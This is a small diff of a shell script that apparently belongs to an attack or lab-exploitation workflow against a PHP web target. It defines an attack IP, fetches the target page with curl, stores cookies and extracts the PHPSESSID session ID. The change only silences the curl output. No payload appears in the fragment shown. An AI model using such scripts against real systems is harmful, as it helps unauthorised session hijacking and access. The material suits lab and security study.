@@ -12,7 +12,7 @@ attack_ip="10.10.30.237"
 mkdir /work/
 
 # Initiate session
-curl -X GET "http://$target_ip" -c "/work/cookie-bac.txt" -L
+curl -X GET "http://$target_ip" -c "/work/cookie-bac.txt" -L > /dev/null
 
 # Extract the PHPSESSID
 PHPSESSID=$(grep PHPSESSID "/work/cookie-bac.txt" | awk '{print $7}')
